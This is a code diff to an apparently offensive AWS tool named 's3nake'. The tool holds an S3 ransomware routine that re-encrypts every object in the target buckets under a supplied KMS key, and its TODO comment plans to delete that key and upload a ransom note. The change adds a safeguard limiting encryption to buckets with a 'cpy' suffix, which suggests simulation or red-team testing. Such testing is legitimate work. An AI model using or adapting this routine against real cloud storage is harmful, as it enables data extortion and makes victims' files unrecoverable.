@@ -151,23 +151,25 @@ def setup(client,buckets,doCheck,region):
 def encrypt(s3_client,buckets,key_id):
     # TODO: encrypt each version
     for bucket_name in buckets:
-        try:
-            print("Encrypting "+bucket_name+"...\r")
-            for key in api.get_s3_keys_as_generator(s3_client,bucket_name):
-                file="\033[2m"+key+"\033[0m"
-                sys.stdout.write('\r\033[K' + file + '\r')
-                s3_client.copy_object(
-                Bucket=bucket_name,
-                CopySource=bucket_name+"/"+key,
-                Key=key,
-                ServerSideEncryption='aws:kms',
-                StorageClass='STANDARD',
-                SSEKMSKeyId=key_id
-                )
-            print(s3nake_print.Green("🔒✔️ "+ bucket_name+" has been successfully encrypted "))
-        except ClientError as error:
-            print(f'    {error.response["Error"]["Code"]} error encrypting bucket {bucket_name}: {error.response["Error"]["Message"]}')
-        
+        if SUFFIX in bucket_name:
+            try:
+                print("Encrypting "+bucket_name+"...\r")
+                for key in api.get_s3_keys_as_generator(s3_client,bucket_name):
+                    file="\033[2m"+key+"\033[0m"
+                    sys.stdout.write('\r\033[K' + file + '\r')
+                    s3_client.copy_object(
+                    Bucket=bucket_name,
+                    CopySource=bucket_name+"/"+key,
+                    Key=key,
+                    ServerSideEncryption='aws:kms',
+                    StorageClass='STANDARD',
+                    SSEKMSKeyId=key_id
+                    )
+                print(s3nake_print.Green("🔒✔️ "+ bucket_name+" has been successfully encrypted "))
+            except ClientError as error:
+                print(f'    {error.response["Error"]["Code"]} error encrypting bucket {bucket_name}: {error.response["Error"]["Message"]}')
+        else:
+            print("Safeguard: can not find \"cpy\" suffix in bucket name => do not encrypt it")
     # TODO: schedule kms key  deletion + upload file in clear with ransom text
 
     
